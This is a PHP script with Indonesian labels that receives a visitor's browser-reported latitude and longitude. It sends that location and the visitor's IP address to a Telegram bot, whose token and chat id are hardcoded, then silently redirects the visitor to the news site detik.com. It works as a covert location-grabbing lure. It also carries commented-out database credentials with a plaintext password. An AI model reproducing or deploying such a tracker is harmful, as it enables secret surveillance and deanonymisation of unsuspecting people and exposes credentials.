<?php 
//$dbhost = "localhost";
//$dbuser = "arrayyan_oprek";
//$dbpass = "Masuk*123#";
//$dbname = "arrayyan_oprek";
//$link   = mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);
date_default_timezone_set("Asia/Singapore"); 
$tanggal	= date("Y-m-d");
$jam  		= date("H:i:s");
$latitude 	= $_POST['latitude'];
$longitude	= $_POST['longitude'];

	if (!empty($latitude) && !empty($longitude)) {
		//echo"<a href=\"https://www.google.com/maps/place/".$latitude."+".$longitude."\" target=\"_blank\">Lihat Lokasi</a> - ";
		//echo $_SERVER['REMOTE_ADDR'];
		
		
		$url = "https://api.telegram.org/bot642869890:AAFM4kdy8JS7LUb57lrlqdzGy44asONyBg8/sendMessage?chat_id=-622669483&text=".urlencode("IP Address\n".$_SERVER['REMOTE_ADDR']."\n\nMaps Lokasi\nhttps://www.google.com/maps/place/".$latitude."+".$longitude);
		$url2 = "https://detik.com";

		/*$fields = array(
			'username'      => "hidden",
			'password'      => "hidden",
			'sendername'    => "iZycon",
			'mobileno'      => 8443223
		);*/
		
		//open connection
		$ch = curl_init();
		
		//set the url, number of POST vars, POST data
		curl_setopt($ch, CURLOPT_URL, $url);
		//curl_setopt($ch, CURLOPT_POST, count($fields));
		//curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));
		
		//execute post
		$result = curl_exec($ch);
		
		
		//close connection
		curl_close($ch);
		
		var_dump($result);
		header("location: https://detik.com");
		
		//Auto Close Tab
		
	}
 ?>